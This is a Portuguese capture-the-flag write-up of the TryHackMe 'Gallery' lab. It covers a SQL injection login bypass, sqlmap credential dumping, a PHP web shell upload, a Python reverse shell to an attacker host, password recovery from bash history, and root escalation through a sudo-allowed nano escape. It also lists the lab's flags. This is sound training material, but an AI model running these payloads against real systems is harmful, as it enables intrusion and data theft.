<!--
title: Gallery — TryHackMe
desc: Exploração de vulnerabilidades em CMS e upload de arquivos para ganhar shell reverso, seguido por privesc no TryHackMe.
tags: labs, thm, writeup, web-sec
readTime: 7 min
-->

<!-- ===================================== -->
<!--        Gallery — TryHackMe Lab        -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Web%20Pentest-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Pentest-Offensive-red?style=flat-square">
  <img src="https://img.shields.io/badge/Web%20Security-AppSec-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Linux-Server-black?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Database-SQL-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Post--Exploitation-Privilege%20Escalation-critical?style=flat-square">
</p>

---

# 🖼️ Gallery — TryHackMe

> Writeup técnico e detalhado do laboratório **Gallery** da plataforma TryHackMe, focado em **exploração de aplicações web vulneráveis**, **SQL Injection**, **upload de arquivos maliciosos**, **pós-exploração** e **escalonamento de privilégios em sistemas Linux**, seguindo uma abordagem estruturada de **pentest em ambiente controlado**.

---

### 📌 Metadados

- **Data:** 2026-02-01  
- **Status:** `#developed`  
- **Categoria:** Web Pentest · Linux Privilege Escalation  
- **Plataforma:** TryHackMe  
- **Aplicação:** Simple Image Gallery System (PHP)  
- **Ambiente:** Linux · Apache · MySQL  

---

### 🏷️ Tags

`#TryHackMe` `#WebPentest` `#SQLInjection` `#FileUpload`  
`#PostExploitation` `#PrivilegeEscalation` `#LinuxSecurity`  
`#AppSec` `#CTF` `#CyberSecurity`

---
# Introdução

O laboratório **Gallery** da TryHackMe representa um desafio prático e educacional que simula um cenário realista de teste de penetração em uma aplicação web vulnerável. Este exercício foi projetado para desenvolver habilidades essenciais em segurança cibernética, abordando múltiplas vulnerabilidades comuns encontradas em ambientes de produção.

## Contexto do Laboratório

A aplicação **Simple Image Gallery System** é um sistema de gerenciamento de galeria de imagens desenvolvido em PHP, que apresenta várias falhas de segurança críticas. Este desafio demonstra como configurações inadequadas, falta de validação de entrada e más práticas de desenvolvimento podem levar ao comprometimento completo de um sistema.

## Objetivos de Aprendizado

Este laboratório tem como objetivo desenvolver competências em:

1. **Enumeração de Redes**: Identificação de serviços expostos e versões
2. **Exploração Web**: SQL Injection, bypass de autenticação, upload de arquivos
3. **Pós-Exploração**: Movimento lateral, escalação de privilégios, coleta de evidências
4. **Análise Forense**: Identificação de vetores de ataque e mitigação de vulnerabilidades

## Vulnerabilidades Principais a Serem Exploradas

- **SQL Injection no Login**: Bypass de autenticação via injeção de SQL
- **File Include/Upload**: Upload de web shells e execução de código remoto
- **Exposição de Credenciais**: Vazamento de senhas em arquivos de histórico
- **Privilege Escalation via Sudo**: Exploração de scripts com permissões inadequadas
- **Weak Authentication**: Uso de hashes MD5 e validação insuficiente

## Metodologia

Este documento segue uma abordagem estruturada de teste de penetração, baseada no framework PTES (Penetration Testing Execution Standard), que inclui:

1. Reconhecimento e Enumeração
    
2. Análise de Vulnerabilidades
    
3. Exploração
    
4. Pós-Exploração
    
5. Documentação e Recomendações
    

Através deste exercício, profissionais de segurança poderão compreender na prática como vulnerabilidades aparentemente isoladas podem ser encadeadas para comprometer completamente um sistema, destacando a importância da defesa em profundidade e das práticas de desenvolvimento seguro.

---
# Mapeamento da Rede

O primeiro passo para explorar o sistema é realizar uma varredura completa para identificar serviços ativos, versões e configurações. Utilizamos o Nmap com as seguintes flags:

```bash
nmap -sC -sV -O 10.67.145.222
```

**Parâmetros utilizados:**

- `-sC`: Executa scripts padrão do Nmap para enumeração adicional
- `-sV`: Detecta versões dos serviços em execução
- `-O`: Realiza detecção do sistema operacional
- `10.67.145.222`: Endereço IP do alvo

**Resultado da varredura:**

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cb:1c:ca:c9:15:72:a7:a9:07:a1:0e:1c:d6:b6:22:49 (RSA)
|   256 89:4e:ea:b3:e1:46:14:0f:bf:84:e9:7e:c4:10:0f:8f (ECDSA)
|_  256 ce:f5:48:f6:9a:fb:d5:ca:73:86:cc:58:24:7e:50:30 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Simple Image Gallery System
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

**Análise dos resultados:**

1. **Porta 22 (SSH):**    
    - Serviço: OpenSSH 8.2p1
    - Sistema: Ubuntu Linux
    - Versão específica: Ubuntu 4ubuntu0.13
    - Chaves de host presentes (RSA, ECDSA, ED25519)

2. **Porta 80 (HTTP):**    
    - Servidor: Apache 2.4.41
    - Página padrão do Apache (não customizada)
    - Pode indicar configuração básica ou redirecionamento

3. **Porta 8080 (HTTP):**
    - Servidor: Apache 2.4.41
    - Aplicação: Simple Image Gallery System
    - Configuração de cookie: PHPSESSID sem flag httponly        
    - Potencial proxy aberto detectado

**Vulnerabilidades preliminares identificadas:**

- Cookie PHPSESSID sem flag `httponly` - vulnerável a ataques XSS
- Potencial proxy aberto - pode ser usado para ataques de relay
- Servidor Apache expõe versão específica

**Resposta à primeira questão:** O sistema possui **3 portas abertas** (22, 80, 8080).

---
# Navegando a aplicação Web (Porta 8080)

Ao acessar `http://10.67.145.222:8080`, encontramos uma aplicação web chamada "Simple Image Gallery System" com um formulário de login:

![Simple Image Gallery System](assets/Pasted%20image%2020260131223457.png)

**Características observadas:**

- Sistema de gerenciamento de galeria de imagens
- Formulário de login com campos username e password
- Possivelmente desenvolvida em PHP (baseado na estrutura)

**Resposta à segunda questão:** O nome do CMS é **"Simple Image Gallery"**.

---
# Bypass de Autenticação via SQL Injection

O formulário de login da aplicação é vulnerável a ataques de SQL Injection. Este tipo de vulnerabilidade ocorre quando a aplicação concatena diretamente a entrada do usuário em consultas SQL sem sanitização adequada.

## Mecanismo da Vulnerabilidade

A aplicação provavelmente executa uma consulta como:

```sql
SELECT * FROM users WHERE username = '$username' AND password = md5('$password')
```

Ao injetar payloads SQL específicos, podemos manipular a lógica da consulta para:

1. Comentar parte da query
2. Alterar a lógica condicional
3. Retornar resultados mesmo com credenciais inválidas

## Exploração Passo a Passo

### Passo 1: Captura da Requisição

Utilizando o Burp Suite com o intercept ativado, capturamos uma requisição de login de teste:

```http
POST /gallery/classes/Login.php?f=login HTTP/1.1
Host: 10.67.145.222:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=test&password=test
```

### Passo 2: Configuração do Ataque no Intruder

1. **Modo de Ataque**: Pitchfork Attack    
    - Permite testar combinações específicas de payloads para usuário e senha
    - Mantém correspondência entre payloads das duas posições

2. **Posições Marcadas**:    
    - `username=§test§`
    - `password=§test§`

3. **Configuração de Payloads**:    
    - **Payload Set 1** (username): Lista de payloads de bypass SQL
    - **Payload Set 2** (password): Mesma lista de payloads
    - Tipo: Simple List
    - Fonte: [Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%2520Injection/Intruder/Auth_Bypass.txt)


![Requisição](assets/Pasted%20image%2020260201105444.png)

### Passo 3: Análise dos Resultados

Após execução, identificamos duas categorias de respostas:

**Respostas de Maior Length:**

```http
HTTP/1.1 200 OK
Date: Sun, 01 Feb 2026 11:04:08 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 20
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"success"}
```

**Respostas de Menor Length:**

```http
HTTP/1.1 200 OK
Date: Sun, 01 Feb 2026 11:03:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 107
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"incorrect","last_qry":"SELECT * from users where username = 'test' and password = md5('test') "}
```

**Análise das diferenças:**

1. **Respostas "incorrect"**: Mostram a query SQL executada, confirmando a vulnerabilidade
2. **Respostas "success"**: Indicam bypass bem-sucedido da autenticação
3. **Payload efetivo**: `admin' #` comenta o restante da query após o username

### Mecanismo de Funcionamento do Payload

Com o payload `admin' #`:

- Query original: `SELECT * FROM users WHERE username = 'admin' #' AND password = md5('qualquer')`
- `#` comenta o restante da linha no MySQL
- Resultado: Apenas verifica se existe usuário 'admin', ignorando a senha

## Acesso à Aplicação

Utilizando as credenciais `admin' #` / `qualquer`, obtemos acesso à dashboard administrativa:

![SQLi Login](assets/Pasted%20image%2020260201111055.png)

**Privilégios obtidos:**

- Gerenciamento de galerias
- Upload de imagens
- Administração de usuários
- Configurações do sistema

---
# Exploração com Searchsploit

## Identificação de Vulnerabilidades Conhecidas

```bash
searchsploit "simple image gallery"
```

**Resultados relevantes:**

- `php/webapps/50198.txt` - SQL Injection no parâmetro `id`
- `php/webapps/49064.txt` - Vulnerabilidade de File Include/Upload

## Análise da Vulnerabilidade SQL Injection

```bash
searchsploit -x php/webapps/50198.txt
```

**Ponto de injeção identificado:** Parâmetro `id` na URL:

```text
/gallery/?page=albums/images&id=1
```

## Exploração com SQLMap

### Enumeração de Bancos de Dados

```bash
sqlmap -u "http://10.67.131.227/gallery/?page=albums/images&id=1" --batch --dbs --threads=10
```

**Resultado:**

```text
available databases [2]:
[*] gallery_db
[*] information_schema
```

### Enumeração de Tabelas

```bash
sqlmap -u "http://10.67.131.227/gallery/?page=albums/images&id=1" -D gallery_db --tables --threads=10 --batch
```

**Resultado:**

```text
Database: gallery_db
[4 tables]
+-------------+
| album_list  |
| images      |
| system_info |
| users       |
+-------------+
```

### Extração de Credenciais

```bash
sqlmap -u "http://10.67.131.227/gallery/?page=albums/images&id=1" -D gallery_db -T users --dump --threads=10 --batch
```

**Resultado:**

```text
+----------+----------------------------------+----------+--------------+
| lastname | password                         | username | firstname    |
+----------+----------------------------------+----------+--------------+
| Admin    | a228b12a08b6527e7978cbe5d914531c | admin    | Adminstrator |
+----------+----------------------------------+----------+--------------+
```

**Análise do hash:** `a228b12a08b6527e7978cbe5d914531c`

- Tipo: MD5 (32 caracteres hexadecimais)
- Conteúdo original: Desconhecido (ainda não quebrado)
- Possível uso direto para autenticação se sistema usar MD5

**Resposta à terceira questão:** O hash MD5 da senha do administrador é **`a228b12a08b6527e7978cbe5d914531c`**.

---
# Vulnerabilidade de File Include

## Análise da Vulnerabilidade

```bash
searchsploit -x php/webapps/49064.txt
```

**Vulnerabilidade identificada:** File Include via parâmetro `img` em `print.php`

**Mecanismo:**

1. A aplicação permite upload de imagens
2. O caminho das imagens é controlado pelo usuário
3. O parâmetro `img` não é validado adequadamente
4. Permite inclusão de arquivos arbitrários

**Impacto:**

- Upload de web shells
- Execução de código remoto
- Comprometimento do sistema de arquivos

## Exploração via Upload Vulnerável

### Criação do Web Shell

```php
<?php
// webshell.php - Shell PHP simples para execução de comandos
?>
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        // Executa comando e captura stdout e stderr
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

**Características do web shell:**

- Interface web para execução de comandos
- Captura de stdout e stderr (`2>&1`)
- Simples mas funcional

### Upload do Web Shell

1. Navegar para: Albums → Upload Image
2. Selecionar arquivo `webshell.php`
3. Upload realizado com sucesso (validação inadequada)

### Localização do Arquivo

Via inspeção de elementos na página de galeria:

```html
<img src="http://10.67.131.227/gallery/uploads/user_1/album_2/1769944860.php" 
     alt="img" 
     loading="lazy" 
     class="w-100 view-img" 
     id="view-img">
```

**Estrutura de diretórios identificada:**

- Base: `/gallery/uploads/`
- Usuário: `user_1/`
- Álbum: `album_2/`
- Arquivo: `1769944860.php` (timestamp como nome)

### Acesso ao Web Shell

URL direta:

```text
`http://10.67.131.227/gallery/uploads/user_1/album_2/1769944860.php`
```

**Comandos de verificação inicial:**

```bash
# Verificar usuário atual
whoami
# www-data

# Verificar sistema operacional
uname -a
# Linux gallery 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

# Verificar python disponível
python3 --version
# Python 3.8.10
```

---
# Reverse Shell

Dentro do webshell podemos identificar que existe o Python3, executando o comando `python3 --version`.

![Python Version](assets/Pasted%20image%2020260201112900.png)

## Preparação do Ambiente

### No atacante (listener):

```bash
nc -lvnp 9001
```

**Parâmetros:**

- `-l`: Modo listener
- `-v`: Verbose (exibe conexões)
- `-n`: Não resolve DNS
- `-p 9001`: Porta de escuta

### Payload Python para Reverse Shell

Com isso podemos usar o [Reverse Shell Generator](https://www.revshells.com/) para criar nosso payload.

![Reverse Shell Generator](assets/Pasted%20image%2020260201113358.png)

**Funcionamento do payload:**

1. Define variáveis de ambiente para host e porta
2. Cria socket e conecta ao listener
3. Duplica file descriptors (stdin, stdout, stderr) para o socket
4. Spawna um shell interativo via pty

### Execução no Web Shell

No campo de comando do web shell, executar:

```python
export RHOST="IP_ATACANTE";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## Estabilização do Shell

Após obter o shell reverso, é necessário estabilizá-lo para uma experiência interativa completa:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Problemas do shell básico:**

- Ausência de histórico de comandos
- Falta de autocompletar (tab)
- Não suporta Ctrl+C, Ctrl+Z
- Interface não interativa    

**Solução: Upgrade para TTY completo**

**Comandos para upgrade completo:**

```bash
# Passo 1: Spawnar shell Python com pty
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Passo 2: Configurar terminal (no lado do atacante, após Ctrl+Z)
stty raw -echo; fg

# Passo 3: Configurar variáveis de ambiente no shell
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 132
```

**Resultado:**

- Shell interativo completo
- Histórico de comandos funcional
- Autocompletar com Tab
- Suporte a Ctrl+C, Ctrl+Z
- Cores e formatação adequadas

## Enumeração Pós-Exploração Inicial

Com shell estabilizado, realizar enumeração básica:

```bash
# Verificar privilégios atuais
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Verificar diretório atual
pwd
# /var/www/html/gallery/uploads/user_1/album_2

# Listar processos em execução
ps aux

# Verificar conexões de rede
netstat -tulpn

# Buscar arquivos sensíveis
find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | head -20
```

---
# Pós-Exploração e Escalonamento de Privilégios

## Enumeração Inicial do Sistema

Após estabelecer o shell reverso como usuário `www-data`, iniciamos a enumeração do sistema para identificar possíveis vetores de escalação de privilégios.

### Navegação e Descoberta de Usuários

```bash
# Listar usuários no sistema
ls -la /home
```

**Resultado:**

```text
drwxr-xr-x  5 root     root     4096 Jul  5  2025 .
drwxr-xr-x 23 root     root     4096 Feb  1 17:08 ..
drwxr-xr-x  6 mike     mike     4096 Feb  1 18:34 mike
drwxr-xr-x  2 ssm-user ssm-user 4096 Jul  5  2025 ssm-user
drwx------  5 root     root     4096 Jul 10  2025 ubuntu
```

Identificamos o usuário `mike` com diretório home em `/home/mike`.

### Tentativa de Acesso ao Arquivo do Usuário

```bash
ls -la /home/mike/
```

**Resultado:**

```text
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```

**Análise de permissões:**

- Dono: `mike` (leitura, escrita, execução)
- Grupo: `mike` (nenhuma permissão)
- Outros: Nenhuma permissão
- **Conclusão:** Apenas o usuário `mike` pode ler este arquivo

### Busca por Backups

```bash
# Procurar diretórios de backup no sistema
find / -type d -name "*backup*" 2>/dev/null
```

**Resultado:**

```text
/etc/lvm/backup
/var/backups
/var/backups/mike_home_backup
```

O diretório `/var/backups/mike_home_backup` é particularmente interessante, pois sugere um backup do diretório home do usuário mike.

### Análise do Backup

```bash
# Explorar o diretório de backup
cd /var/backups/mike_home_backup
ls -la
```

**Resultado:**

```text
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Jul 10  2025 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
```

**Análise:** O backup é propriedade de `root` mas tem permissões de leitura para todos (`r-x`). Isso permite que qualquer usuário leia os arquivos de backup.

### Extração de Credenciais do Histórico Bash

```bash
# Examinar o histórico de comandos do usuário mike
cat .bash_history
```

**Conteúdo do arquivo:**

```text
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

**Análise crítica da linha: `sudo -lb3stpassw0rdbr0xx`**

**O que aconteceu:**

1. O usuário `mike` tentou executar `sudo -l` para listar seus privilégios sudo    
2. Por engano, digitou a senha **imediatamente após** a flag `-l`    
3. A senha `b3stpassw0rdbr0xx` foi registrada no histórico como parte do comando    
4. Esta senha provavelmente é a senha real do usuário `mike`    

### Acesso ao Usuário Mike

```bash
su mike
Password: b3stpassw0rdbr0xx
```

### Coleta da Flag do Usuário

```bash
# Ler a flag do usuário mike
cat /home/mike/user.txt
```

**Resultado:**

```text
THM{af05cd30bfed67849befd546ef}
```

**Resposta à quarta questão:** A flag do usuário é **`THM{af05cd30bfed67849befd546ef}`**.

---
# Escalonamento de Privilégios para Root

## Análise de Privilégios Sudo

Com acesso ao usuário `mike`, verificamos seus privilégios sudo:

```bash
sudo -l
```

**Resultado:**

```text
Matching Defaults entries for mike on ip-10-67-148-212:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-67-148-212:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

**Análise dos privilégios:**

1. **NOPASSWD**: Não requer senha para executar
2. **Comando permitido**: `/bin/bash /opt/rootkit.sh`
3. **Executa como**: `root` (privilégios máximos)

## Análise do Script rootkit.sh

```bash
# Examinar o conteúdo do script
cat /opt/rootkit.sh
```

**Conteúdo do script:**

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

**Análise detalhada do script:**

1. **Shebang**: `#!/bin/bash` - Executa com bash
2. **Função**: Menu interativo para rkhunter (Rootkit Hunter)
3. **Opções**:
    - `versioncheck`: Verifica versão do rkhunter
    - `update`: Atualiza rkhunter
    - `list`: Lista verificações do rkhunter        
    - `read`: Abre `/root/report.txt` no editor nano
4. **Vulnerabilidade crítica**: A opção `read` executa `nano` com privilégios de root

## Exploração da Vulnerabilidade do Nano

### Mecanismo de Exploração

**Por que o nano é explorável?**

- Nano permite executar comandos do sistema através de seu interface
- Quando executado como root, esses comandos também rodam como root
- O atalho `Ctrl+R` no nano executa um comando shell
- O atalho `Ctrl+X` sai do nano (mas pode ser usado em sequência)

**Fluxo de exploração:**

1. Executar script como root → `sudo /bin/bash /opt/rootkit.sh`
2. Selecionar opção `read` → Abre nano como root
3. Usar `Ctrl+R` → Prompt de comando dentro do nano
4. Executar comando shell → Comando roda como root
5. Obter shell root interativo

### Execução da Exploração

#### Passo 1: Executar o Script

```bash
sudo -u root /bin/bash /opt/rootkit.sh
```

**Saída esperada:**

```text
Would you like to versioncheck, update, list or read the report ? 
```

#### Passo 2: Selecionar Opção Vulnerável

Digitar: `read` e pressionar Enter

**Resultado:** O editor nano abre o arquivo `/root/report.txt` com privilégios de root.

#### Passo 3: Explorar Nano para Obter Shell Root

Dentro do nano, pressionar na sequência:

1. **`Ctrl+R`** (Read File) - Mas neste contexto, abre prompt de comando
2. **`Ctrl+X`** (Exit) - Para sair do prompt se necessário
3. Ao abrir o prompt de comando digite:

```bash
reset; sh 1>&0 2>&0
```

### Verificação de Privilégios Root

Após obter o shell:

```bash
# Verificar se somos root
whoami
# Deve retornar: root

id
# uid=0(root) gid=0(root) groups=0(root)
```

### Resumo da Vulnerabilidade

**CVE Relacionada:** Não há CVE específica, mas é uma má configuração comum  
**Vetor:** Uso do nano em scripts sudo sem restrições  
**Impacto:** Execução arbitrária de código como root  
**Mitigação:**

- Não usar editores interativos em scripts sudo
- Usar `sudoedit` com `EDITOR` seguro
- Implementar política de menor privilégio

## Acesso ao Diretório Root e Enumeração Final

Após obter privilégios de root através da exploração bem-sucedida, procedemos com a enumeração completa do sistema para identificar a flag final e entender completamente o ambiente comprometido.

### Navegação ao Diretório Home do Root

```bash
# Navegar para o diretório home do usuário root
cd /root

# Alternativamente, usando til (~) que expande para o home do usuário atual
cd ~

# Verificar o diretório atual
pwd
# Deve retornar: /root
```

### Análise Detalhada do Conteúdo do Diretório Root

```bash
# Listar todos os arquivos, incluindo ocultos, com formato longo
ls -al
```

**Resultado:**

```text
drwx------  6 root root 4096 Feb  1 18:53 .
drwxr-xr-x 23 root root 4096 Feb  1 17:08 ..
-rw-r--r--  1 root root 3107 May 20  2021 .bashrc
drwx------  2 root root 4096 Feb 12  2022 .cache
drwx------  3 root root 4096 Feb 12  2022 .gnupg
drwxr-xr-x  3 root root 4096 May 20  2021 .local
-rw-------  1 root root  440 Aug 25  2021 .mysql_history
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r--r--  1 root root 3404 May 18  2021 report.txt
-rw-r--r--  1 root root 1024 Feb  1 18:53 .report.txt.swp
-rw-r--r--  1 root root   43 May 17  2021 root.txt
drwx------  2 root root 4096 May 20  2021 .ssh
-rw-------  1 root root 1496 Jul 10  2025 .viminfo
```

### Análise de Segurança dos Arquivos Identificados

**1. Permissões do Diretório Root (`drwx------`):**

- **Dono (root):** rwx (leitura, escrita, execução)
- **Grupo (root):** --- (nenhuma permissão)
- **Outros:** --- (nenhuma permissão)
- **Conclusão:** Apenas root pode acessar este diretório, configuração adequada

**2. Arquivos de Configuração Identificados:**

| Arquivo           | Permissões | Propriedade | Tamanho | Significado de Segurança                         |
| ----------------- | ---------- | ----------- | ------- | ------------------------------------------------ |
| `.bashrc`         | 644        | root:root   | 3107    | Configurações do shell, potencial para backdoors |
| `.mysql_history`  | 600        | root:root   | 440     | Histórico do MySQL, pode conter credenciais      |
| `report.txt`      | 644        | root:root   | 3404    | Arquivo de relatório do rkhunter                 |
| `.report.txt.swp` | 644        | root:root   | 1024    | Arquivo swap do vim/nano (indica edição recente) |
| `root.txt`        | 644        | root:root   | 43      | Flag do desafio                                  |
| `.ssh/`           | 700        | root:root   | 4096    | Chaves SSH, acesso remoto privilegiado           |

### Recuperação da Flag Root

```bash
# Ler o conteúdo do arquivo root.txt
cat root.txt
```

**Conteúdo da flag:**

```text
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

**Resposta à questão final:** A flag root é **`THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`**.

---
# Conclusão

O laboratório Gallery da TryHackMe demonstrou de forma prática e abrangente como múltiplas vulnerabilidades de segurança podem ser exploradas sequencialmente para comprometer completamente um sistema. Este exercício não apenas testou habilidades técnicas, mas também destacou a importância de uma abordagem metódica e estruturada para testes de penetração.

## Principais Lições Aprendidas

### 1. Importância da Validação de Entrada

A vulnerabilidade de SQL Injection evidenciou as consequências críticas de não validar e sanitizar adequadamente a entrada do usuário. A implementação de prepared statements e validação rigorosa deve ser uma prioridade em todo o desenvolvimento de aplicações.

### 2. Defesa em Profundidade

O sucesso da exploração dependeu da cadeia de vulnerabilidades: SQL Injection → Upload de Shell → Exposição de Credenciais → Escalação de Privilégios. Isso demonstra a necessidade de múltiplas camadas de defesa para impedir que uma única falha leve ao comprometimento total.

### 3. Gestão Adequada de Credenciais

A descoberta da senha no histórico do bash destacou a importância de:

- Políticas adequadas de rotação de senhas
- Configuração correta do HISTCONTROL no Linux
- Treinamento de usuários sobre práticas seguras
- Monitoramento de arquivos sensíveis

### 4. Configuração Segura do Sudo

A exploração do script rootkit.sh revelou os perigos de:

- Permitir editores interativos em comandos sudo
- Uso indiscriminado de NOPASSWD
- Falta de restrições em scripts executados com privilégios elevados
